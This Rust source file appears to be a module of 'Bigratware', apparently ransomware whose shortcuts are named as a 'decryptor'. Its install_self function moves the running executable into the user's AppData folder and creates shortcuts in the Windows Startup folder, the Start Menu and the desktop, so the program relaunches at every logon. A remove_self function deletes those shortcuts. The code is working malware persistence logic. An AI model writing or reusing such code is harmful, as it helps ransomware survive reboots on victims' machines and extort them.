use std::{env, fs};
use anyhow::Result;
use mslnk::ShellLink;


/// Install Bigratware into `%appdata%/bigratware` and create shortcuts
/// in start menu, startup folder and on desktop
pub fn install_self() -> Result<()> {
    let target_exe_dir = dirs_next::data_dir().unwrap().join("bigratware");
    fs::create_dir(&target_exe_dir)?;
    let target_exe = target_exe_dir.join("bigratware.exe");
    fs::rename(
        env::current_exe()?,
        &target_exe,
    )?;

    let link = ShellLink::new(&target_exe)?;
    let start_menu_dir = dirs_next::data_dir().unwrap().join("Microsoft/Windows/Start Menu/Programs");
    link.create_lnk(start_menu_dir.join("Startup/bigratware-decryptor.lnk"))?;
    link.create_lnk(start_menu_dir.join("Bigratware Decryptor.lnk")).ok();
    link.create_lnk(dirs_next::desktop_dir().unwrap().join("Bigratware Decryptor.lnk")).ok();

    Ok(())
}

/// Remove shortcuts created by `install_self()`
/// in start menu, startup folder and on desktop
pub fn remove_self() -> Result<()> {
    let start_menu_dir = dirs_next::data_dir().unwrap().join("Microsoft/Windows/Start Menu/Programs");
    fs::remove_file(dirs_next::desktop_dir().unwrap().join("Bigratware Decryptor.lnk")).ok();
    fs::remove_file(start_menu_dir.join("Bigratware Decryptor.lnk")).ok();
    fs::remove_file(start_menu_dir.join("Startup/bigratware-decryptor.lnk"))?;

    Ok(())
}
